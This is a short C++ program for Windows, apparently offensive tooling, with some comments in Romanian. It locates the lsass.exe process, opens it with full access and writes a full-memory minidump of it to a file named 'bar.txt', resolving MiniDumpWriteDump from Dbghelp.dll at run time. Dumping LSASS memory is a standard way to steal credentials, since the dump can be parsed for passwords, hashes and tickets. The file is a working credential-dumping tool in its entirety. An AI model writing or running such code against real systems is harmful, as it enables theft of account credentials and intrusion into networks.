#include<iostream>
#include<Windows.h>
#include <minidumpapiset.h>
#include <tlhelp32.h>
#include <string.h>

typedef BOOL (WINAPI* MiniDumpWriteDumpFunctionPointer)(
	HANDLE                            hProcess,
	DWORD                             ProcessId,
	HANDLE                            hFile,
	MINIDUMP_TYPE                     DumpType,
	PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
	PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
	PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);


int main() {
	HMODULE dbghelpModule = LoadLibraryA("Dbghelp.dll");

	MiniDumpWriteDumpFunctionPointer MiniDumpWriteDump = (MiniDumpWriteDumpFunctionPointer)GetProcAddress(dbghelpModule, "MiniDumpWriteDump");

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    // get LSASS process
    HANDLE hLsass = NULL;
    DWORD lsassPid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            std::wstring wExeFile(entry.szExeFile);
            std::string exeFile(wExeFile.begin(), wExeFile.end());

            if (strcmp(exeFile.c_str(), "lsass.exe") == 0)
            {
                hLsass = OpenProcess(0x001F0FFF, FALSE, entry.th32ProcessID);

                if (hLsass == NULL) {
                    DWORD err = GetLastError();
                    std::cout << "[+] Error: " << err << "\n";
                    return 1;
                }

                lsassPid = entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);

    // create dump file
    HANDLE hDumpFile = CreateFileA(
        "bar.txt",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_TEMPORARY,
        NULL);

    if (hDumpFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        std::cout << "[+] Error: " << err << "\n";
        return 1;
    }

    bool dumped = MiniDumpWriteDump(
        hLsass, // HANDLE-ul procesului
        lsassPid, // PID-ul procesului
        hDumpFile, // preluam HANDLE-ul unmanaged catre fisierul de output
        MiniDumpWithFullMemory, // valoare ENUM _MINIDUMP_TYPE, 2 - MiniDumpWithFullMemory
        NULL,
        NULL,
        NULL
    );

    if (!dumped) {
        DWORD err = GetLastError();
        std::cout << "[+] Error: " << err << "\n";
        return 1;
    }

    CloseHandle(hLsass);
	return 0;
}